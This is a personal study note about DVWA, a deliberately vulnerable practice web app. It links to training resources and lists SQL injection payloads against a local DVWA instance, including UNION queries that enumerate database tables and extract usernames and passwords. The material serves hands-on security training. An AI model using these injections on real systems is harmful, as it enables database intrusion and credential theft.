---
Owner: Chris Adams
date: 
tags:
  - github
  - app-sec
  - pentesting
layout: github
draft:
---

https://github.com/digininja/DVWA

**Vulnerable Web App**
**THM**: [https://tryhackme.com/room/dvwa](https://tryhackme.com/room/dvwa)
**GitHub**: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
**Kali packages:** [https://www.kali.org/tools/dvwa/](https://www.kali.org/tools/dvwa/)
**SourceForge**: [https://sourceforge.net/projects/dvwa.mirror/](https://sourceforge.net/projects/dvwa.mirror/)
- **DVWA** (Damn Vulnerable Web Application)
    - PHP/MySQL web application for practice
- **SQL Injection**
    - localhost/dvwa
        - ‘ or ‘1’ = ‘1
            - displays all users and surname
        - ‘ union select @@version, null #
            - display database version
        - ‘ and 1 = 0 union select null, table_name from information_schema.tables #
            - displays all tables in information_schema
        - %’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #


---
Link to other Github repos on this site: [[GitHub Resources Index]]